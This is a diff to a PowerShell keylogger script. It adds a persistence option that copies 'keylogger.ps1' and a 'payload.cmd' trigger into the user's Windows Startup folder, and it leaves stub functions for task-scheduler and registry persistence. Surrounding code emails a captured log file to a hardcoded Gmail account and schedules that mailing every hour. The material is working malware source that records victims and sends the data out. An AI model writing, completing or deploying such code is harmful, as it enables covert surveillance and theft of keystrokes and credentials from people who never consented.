@@ -1,8 +1,21 @@
+[CmdletBinding()]
+Param (
+	[Parameter(Mandatory = $false)]
+	[ValidateSet($True, "Startup", "TaskScheduler", "Registry", "All")]
+	[string]$Type = "Startup"
+)
+
 
 $Email = "username@gmail.com"
 $Password = "password"
 
+$validPersistanceTypes = "Startup", "TaskScheduler", "Registry", "All"
+
+
+
+
 function sendMail($logFile="$env:temp\$env:username.log") {
+	
     $Subject = "You got mail from $env:USERNAME!"
     $Body = @"
                 This email has been sent from $env:COMPUTERNAME
@@ -37,5 +50,65 @@ function scheduleMail($MinutesInterval=60) {
         }
 }
 
+function persistStartup() {
+	
+	$script = "keylogger.ps1"
+	$trigger = "payload.cmd"
+	$scriptPath = "$PWD\$script"
+	$triggerPath = "$PWD\$trigger"
+	
+	$scriptDestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$script"
+	$triggerDestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$trigger"
+	
+	Copy-Item -Path $scriptPath -Destination $scriptDestinationPath -Force
+	Copy-Item -Path $triggerPath -Destination $triggerDestinationPath -Force
+
+}
+
+function persistTaskScheduler() {
+	
+}
+
+function persistRegistry() {
+}
+
+function persistAll() {
+	persistStartup
+	persistTaskScheduler
+	persistRegistry
+}
+
+
+function CreatePersistance($Type) {
+	
+	switch ($Type) {
+			
+	"Startup" {
+        # Place your specific logic for Startup here
+		persistStartup
+    }
+    "TaskScheduler" {
+        # Place your specific logic for TaskScheduler here
+        persistTaskScheduler
+    }
+    "Registry" {
+        # Place your specific logic for Registry here
+        persistRegistry
+    }
+	"All" {
+        # Place your specific logic for Registry here
+        persistAll
+    }
+    default {
+        Write-Output "Unknown option selected."
+    }
+}
+	
+	
+}
+
+
+
 sendMail
+CreatePersistance -Type $Type
 scheduleMail -MinutesInterval 60
